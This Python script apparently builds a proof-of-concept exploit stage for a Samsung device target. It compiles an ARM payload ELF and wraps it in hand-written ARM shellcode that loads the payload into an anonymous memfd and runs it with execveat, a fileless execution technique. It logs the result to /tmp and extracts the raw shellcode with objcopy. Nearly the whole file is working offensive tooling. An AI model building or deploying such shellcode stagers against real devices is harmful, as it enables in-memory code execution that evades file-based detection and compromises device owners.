#!/usr/bin/env python3
import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
ZIG = ROOT / "tools" / "zig" / "zig-x86_64-windows-0.15.1" / "zig.exe"
OUT = ROOT / "outputs" / "samsung-m5" / "pocs"
PAYLOAD_S = OUT / "memfd_exec_payload.S"
PAYLOAD_ELF = OUT / "memfd_exec_payload.elf"
PROBE_S = OUT / "node_memfd_execveat_probe.S"
PROBE_O = OUT / "node_memfd_execveat_probe.o"
PROBE_BIN = OUT / "node_memfd_execveat_probe.bin"


def byte_lines(data: bytes) -> str:
    lines = []
    for i in range(0, len(data), 12):
        chunk = data[i : i + 12]
        lines.append("    .byte " + ",".join(f"0x{b:02x}" for b in chunk))
    return "\n".join(lines)


def main() -> None:
    subprocess.run(
        [
            str(ZIG),
            "cc",
            "-target",
            "arm-linux-gnueabi",
            "-nostdlib",
            "-static",
            str(PAYLOAD_S),
            "-o",
            str(PAYLOAD_ELF),
        ],
        check=True,
    )
    payload = PAYLOAD_ELF.read_bytes()
    asm = f""".syntax unified
.arm
.global _start

_start:
    push {{r4-r9, lr}}
    adr r9, result

    @ fd = memfd_create("codex_exec", 0)
    adr r0, memfd_name
    mov r1, #0
    movw r7, #385
    svc #0
    str r0, [r9, #4]
    mov r4, r0
    cmp r0, #0
    blt write_result

    @ write(fd, payload, payload_len)
    mov r0, r4
    adr r1, payload_start
    ldr r2, payload_len
    mov r7, #4
    svc #0
    str r0, [r9, #8]
    cmp r0, #0
    blt write_result

    @ Build argv/envp on the current user stack. Avoid absolute pointers in
    @ raw shellcode because objcopy does not apply runtime relocations.
    mov r6, sp
    mov r0, #0
    push {{r0}}
    adr r5, arg0
    push {{r5}}
    mov r2, sp
    sub sp, sp, #4
    mov r3, sp

    @ execveat(fd, "", argv, envp, AT_EMPTY_PATH)
    mov r0, r4
    adr r1, empty_path
    movw r4, #0x1000
    movw r7, #387
    svc #0
    mov sp, r6
    str r0, [r9, #12]

write_result:
    @ If fexecve succeeds, this code is never reached.
    adr r0, out_path
    movw r1, #0x241
    movw r2, #438
    mov r7, #5
    svc #0
    mov r5, r0
    cmp r0, #0
    blt ret_ok

    mov r0, r5
    mov r1, r9
    mov r2, #16
    mov r7, #4
    svc #0

    mov r0, r5
    mov r7, #6
    svc #0

ret_ok:
    mov r0, #0
    pop {{r4-r9, pc}}

.align 2
result:
    .word 0x4158454d  @ "MEXA" little-endian
    .word 0xffffffff  @ memfd_create rc / fd
    .word 0xffffffff  @ write rc
    .word 0xffffffff  @ fexecve rc if it returns
payload_len:
    .word {len(payload)}
memfd_name:
    .asciz "codex_exec"
arg0:
    .asciz "codex_exec"
out_path:
    .asciz "/tmp/execveat_probe.bin"
empty_path:
    .asciz ""
.align 2
payload_start:
{byte_lines(payload)}
"""
    PROBE_S.write_text(asm, encoding="ascii")
    subprocess.run([str(ZIG), "cc", "-target", "arm-linux-gnueabi", "-c", str(PROBE_S), "-o", str(PROBE_O)], check=True)
    subprocess.run([str(ZIG), "objcopy", "-O", "binary", "-j", ".text", str(PROBE_O), str(PROBE_BIN)], check=True)
    print(f"payload ELF: {PAYLOAD_ELF} ({len(payload)} bytes)")
    print(f"probe shellcode: {PROBE_BIN} ({PROBE_BIN.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
